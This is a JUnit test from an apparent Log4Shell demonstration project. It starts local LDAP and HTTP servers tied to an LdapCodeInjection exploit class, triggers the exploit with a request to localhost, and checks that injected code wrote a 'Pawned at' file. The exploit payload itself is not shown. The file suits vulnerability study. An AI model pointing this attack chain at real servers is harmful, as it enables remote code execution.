package io.github.hurynovich.log4shell.test;

import io.github.hurynovich.log4shell.environment.HttpServerSetup;
import io.github.hurynovich.log4shell.environment.LdapServerSetup;
import io.github.hurynovich.log4shell.exploit.LdapCodeInjection;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;

import static java.net.http.HttpResponse.BodyHandlers;
import static java.nio.file.Files.readString;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class LdapCodeInjectionAttackTest {

    final int LDAP_PORT = 12345;
    final int HTTP_PORT = 54321;
    final Class<?> exploit = LdapCodeInjection.class;

    final HttpServerSetup httpSrv = new HttpServerSetup(HTTP_PORT, exploit);
    final LdapServerSetup ldapSrv = new LdapServerSetup(LDAP_PORT, HTTP_PORT, exploit);

    @Test
    void ldapCodeInjectionAttackTest() throws Exception {
        // Ensure there is no such file
        File tmpFile = LdapCodeInjection.TMP_FILE_PATH.toFile();
        assertTrue(!tmpFile.exists() || tmpFile.delete());

        // Make http call to initiate code injection
        var client = HttpClient.newBuilder().build();
        var req = HttpRequest.newBuilder().GET().uri(URI.create("http://localhost:54321?name=")).build();
        var res = client.send(req, BodyHandlers.discarding());
        assertEquals(200 , res.statusCode());

        // Ensure that injected code was executed and file was created
        assertTrue(tmpFile.exists());
        assertTrue(readString(tmpFile.toPath()).startsWith("Pawned at"));
    }

    @BeforeEach
    void startupServers() throws Exception {
        httpSrv.start();
        ldapSrv.start();
    }

    @AfterEach
    void shutdownServers(){
        httpSrv.stop();
        ldapSrv.stop();
    }
}
